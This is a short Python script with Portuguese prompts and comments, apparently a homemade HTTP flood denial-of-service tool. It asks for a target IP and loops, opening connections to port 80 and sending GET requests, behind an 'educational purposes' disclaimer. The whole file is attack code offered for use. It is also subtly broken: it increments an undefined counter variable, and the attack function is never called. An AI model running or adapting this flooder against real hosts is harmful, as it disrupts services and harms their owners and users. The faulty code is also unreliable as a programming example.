#importação para poder utilizar o time.sleep e o os.system
import socket
import threading
import time
import os
#código e avisos
print('AVISO LEGAL: ESTA FERRAMENTA SERVE PARA PROPÓSITOS EDUCACIONAIS USE AO SEU RISCO!!!')
time.sleep(5)
os.system("clear")
print('Por chokoznet')
time.sleep(2)
print("carregando ferramenta...")
os.system("clear")
alvo = input('IP do alvo: ')
seuip = input('seuip: ')
port = 80
attack_num = 0
print('Começando ataque...')
time.sleep(3)
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((alvo, port))
        s.sendto(("GET /" + alvo + " HTTP/1.1\r\n").encode('ascii'), (alvo, port))
        s.sendto(("Host: " + seuip + "\r\n\r\n").encode('ascii'), (alvo, port))
        
        global attack_num
        numerodeataque += 1
        print(numerodeataque)
        
        s.close()
